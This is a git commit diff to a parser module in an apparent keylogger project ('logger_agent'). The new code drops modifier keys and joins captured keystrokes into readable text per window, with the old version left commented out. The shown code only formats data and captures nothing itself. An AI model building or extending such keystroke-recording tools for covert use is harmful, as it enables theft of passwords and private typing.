cc4601d3db0ee2ffd8882cc86097d41ca7a89265
Yoel ider <yoeli5746@gmail.com>
2025-02-27 10:07:35 +0200

    fixed parser

--- logger_agent/src/parser/encryption/parsers.py
+++ logger_agent/src/parser/encryption/parsers.py
@@ -1,22 +1,54 @@
+# from interface.parser_interface import ParserInterface
+
+# class Parser(ParserInterface):
+   
+#    #func cleaning keys
+#   def parse_data(self, keys: dict) -> dict:
+    
+#     new_dict = {}
+#     for window, words in keys.items():
+#         result = []
+#         for word in words:
+#             if word == 'space':  
+#                 result.append(" ")   
+#             elif len(word) > 1:
+#                 result.append(f"<{word}>")  
+#             else:
+#                 result.append(word)  
+
+#         if result:  
+#             new_dict[window] = ''.join(result).strip()  
+
+#     return new_dict  
+
+
 from interface.parser_interface import ParserInterface
 
 class Parser(ParserInterface):
-   
-   #func cleaning keys
-  def parse_data(self, keys: dict) -> dict:
+    def parse_data(self, buffer):
+        """parser buffer."""
+        return self.clean_and_join(buffer)
     
-    new_dict = {}
-    for window, words in keys.items():
-        result = []
-        for word in words:
-            if word == 'space':  
-                result.append(" ")   
-            elif len(word) > 1:
-                result.append(f"<{word}>")  
-            else:
-                result.append(word)  
+    
+    def clean_and_join(self, keys: dict) -> dict:
+        unwanted_keys = {"ctrl", "left", "right", "right shift","left shift", "alt", "tab", "backspace"}
+        
+        new_dict = {}
+        for window, words in keys.items():
+            result = []
+            for word in words:
+                if word.lower() in unwanted_keys:  
+                    continue  
+                elif word == 'space':
+                    result.append(" ")  
+                elif word == 'enter':
+                    result.append("[enter]") 
+                elif word == 'delete':
+                    result.append("[delete]")  
+                else:
+                    result.append(word)  
 
-        if result:  
-            new_dict[window] = ''.join(result).strip()  
+            if result:  
+                new_dict[window] = ''.join(result).strip()  
 
-    return new_dict  
+        return new_dict
